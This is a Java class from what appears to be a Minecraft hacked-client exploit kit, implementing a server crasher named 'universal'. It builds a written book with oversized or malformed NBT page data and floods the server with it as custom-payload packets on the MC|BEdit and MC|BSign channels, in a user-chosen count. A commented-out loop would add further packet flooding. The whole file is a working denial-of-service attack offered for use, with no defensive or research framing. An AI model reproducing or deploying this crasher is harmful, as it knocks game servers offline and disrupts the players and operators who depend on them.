package tk.milkthedev.paradise.exploit.impl.nbt;

import tk.milkthedev.paradise.exception.ExploitException;
import tk.milkthedev.paradise.exploit.Exploit;
import tk.milkthedev.paradise.exploit.ExploitInfo;
import tk.milkthedev.paradise.exploit.ExploitType;
import tk.milkthedev.paradise.exploit.argument.Argument;
import tk.milkthedev.paradise.helper.ChatHelper;
import tk.milkthedev.paradise.helper.NetHelper;
import tk.milkthedev.paradise.holder.ExploitHolder;
import io.netty.buffer.Unpooled;
import java.util.concurrent.ThreadLocalRandom;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import org.apache.commons.lang3.RandomStringUtils;

/**
 * auhtor: mori0 тεαм ĦǺχÒЯ source: https://www.youtube.com/watch?v=OxHEaFUbdlE
 */

@ExploitInfo(
    name = "universal",
    type = ExploitType.NBT,
    description = "The most skidded crasher by fixmem and others"
)
public class OnePacketExploit extends Exploit<PacketBuffer> {

  public OnePacketExploit() {
    super(() -> {
          ItemStack itemStack = new ItemStack(Items.written_book);
          NBTTagCompound compound = new NBTTagCompound();

          NBTTagList pages = new NBTTagList();
          pages.appendTag(new NBTTagString(ExploitHolder.getExtraJson()));

          compound.setString("author", RandomStringUtils.randomAlphabetic(10));
          compound.setString("title", RandomStringUtils.randomAlphabetic(10));
          compound.setByte("resolved", (byte) 1);
          compound.setTag("pages", pages);

          itemStack.setTagCompound(compound);

          PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
          packetBuffer.writeItemStackToBuffer(itemStack);

          return packetBuffer;
        },
        new Argument("packets", 0, Integer.class));
  }

  @Override
  public void execute(Object... args) throws ExploitException {
    long start = System.currentTimeMillis();
    int packets = (int) args[0];

    ChatHelper.printMessage(
        String.format("Sending Method: &c%s&7, Packets: &c%s", getName(), args[0]));
    for (int i = 0; i < packets; i++) {
      NetHelper.sendPacket(new C17PacketCustomPayload(
          ThreadLocalRandom.current().nextBoolean() ? "MC|BEdit" : "MC|BSign",
          new PacketBuffer(exploitSource().get().copy())));
//        for (int index = 0; index < 100000; index++) {
//            NetHelper.sendPacket(new C03PacketPlayer(true));
//            NetHelper.sendPacket(new C08PacketPlayerBlockPlacement(new ItemStack(Items.apple)));
//            NetHelper.sendPacket(new C03PacketPlayer(true));
//            NetHelper.sendPacket(new C08PacketPlayerBlockPlacement(new ItemStack(Items.carrot)));
//        }
    }
        ChatHelper.printMessage(String.format("Sent Method: &c%s&7, Time: &c%sms", getName(),
        System.currentTimeMillis() - start));
  }
}
